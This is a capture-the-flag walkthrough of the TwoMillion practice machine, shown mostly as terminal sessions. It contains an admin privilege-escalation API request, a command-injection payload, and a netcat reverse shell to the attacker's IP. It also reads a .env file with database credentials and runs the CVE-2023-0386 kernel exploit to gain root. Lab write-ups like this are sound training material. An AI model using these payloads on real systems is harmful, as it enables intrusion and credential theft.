# TwoMillion

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -T4 -p- -sV twomillion.htb
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-23 21:33 EDT
Nmap scan report for twomillion.htb (10.10.11.221)
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to <http://2million.htb/>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FUMfTYnautsDfcOFdIFUp%2Fimage.png?alt=media&#x26;token=304d7de8-497f-4e6f-951d-35aea305c70f" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FRZmSG7DDSnt8oEYcCGsV%2Fimage.png?alt=media&#x26;token=7ede9c2d-5719-4d84-aee1-3bff80e4e3d5" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FG4LqFURJN2qIvPZJA07t%2Fimage.png?alt=media&#x26;token=ef9240ed-e2d1-4e73-835b-c45b025d32a7" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F1uYB8DXVPsTD35ylMRRX%2Fimage.png?alt=media&#x26;token=4637fa80-968f-419d-8ee5-33de7896d951" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FjVQ6eu59PbIItp10mWwq%2Fimage.png?alt=media&#x26;token=11107710-f0d6-4bcb-a6b3-c3912721455e" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FOyFHSD5qn1cW4g1aQotc%2Fimage.png?alt=media&#x26;token=4ba7e5d4-1e24-4de5-8376-7346f459941f" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FsuFmFJelyT11SaITB1fT%2Fimage.png?alt=media&#x26;token=5c89ecb2-110d-45f1-9380-e702170da270" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FAuGEIu5X3QuFlQgnMGFm%2Fimage.png?alt=media&#x26;token=967ca28e-0e09-4f2c-8227-2024ac64296e" alt=""><figcaption></figcaption></figure>

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo 'V09KRFMtQ1gxNDQtVTUyS1otRFY2WDY=' | base64 -d 
WOJDS-CX144-U52KZ-DV6X6
```

We can login but there is nothing interesting to be done

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl <http://2million.htb/api> -v 
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
* using HTTP/1.x
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.12.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Fri, 24 Oct 2025 02:33:20 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=qdpipnso30cikuq2sfou170k49; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
```

We can try by passing our PHPSESSID cookie

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -v <http://2million.htb/api> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f        
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
* using HTTP/1.x
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.12.1
> Accept: */*
> Cookie: PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Fri, 24 Oct 2025 02:33:56 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
{"\\/api\\/v1":"Version 1 of the API"}
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/auth> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f | jq
{
  "message": false
}
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/settings/update> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f -v -X PUT | jq
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
* using HTTP/1.x
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.12.1
> Accept: */*
> Cookie: PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Fri, 24 Oct 2025 02:35:45 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [64 bytes data]
* Connection #0 to host 2million.htb left intact
{
  "status": "danger",
  "message": "Invalid content type."
}
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/settings/update> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f -X PUT -H 'Content-Type: application/json' | jq
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/settings/update> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f -X PUT -H 'Content-Type: application/json' -d '{"email": "test@test.com"}' | jq
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/settings/update> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f -X PUT -H 'Content-Type: application/json' -d '{"email": "test@test.com", "is_admin": "true"}' | jq
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/settings/update> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f -X PUT -H 'Content-Type: application/json' -d '{"email": "test@test.com", "is_admin": 1}' | jq  
{
  "id": 13,
  "username": "test",
  "is_admin": 1
}
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/auth> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f                                                                            
{"message":true}
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/vpn/generate> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f -X POST -H 'Content-Type: application/json'
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/vpn/generate> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f -X POST -H 'Content-Type: application/json' -d '{"username": "test"}'
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/vpn/generate> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f -X POST -H 'Content-Type: application/json' -d '{"username": "test;id;"}'   
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s <http://2million.htb/api/v1/admin/vpn/generate> -b PHPSESSID=3hncoeu0pqpvvp8svm8mf0399f -X POST -H 'Content-Type: application/json' -d '{"username": "test;busybox nc 10.10.16.2 6666 -e sh;"}'
```

```bash
www-data@2million:~/html$ ls -la 
total 56
drwxr-xr-x 10 root root 4096 Oct 24 02:50 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Oct 24 02:50 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

```bash
admin@2million:/var/mail$ cat admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

```bash
admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
```

```bash
admin@2million:~/CVE-2023-0386$ ./exp 
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Oct 24 03:18 .
drwxrwxr-x 6 root   root     4096 Oct 24 03:18 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386# sudo -l
Matching Defaults entries for root on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty

User root may run the following commands on localhost:
    (ALL : ALL) ALL
```
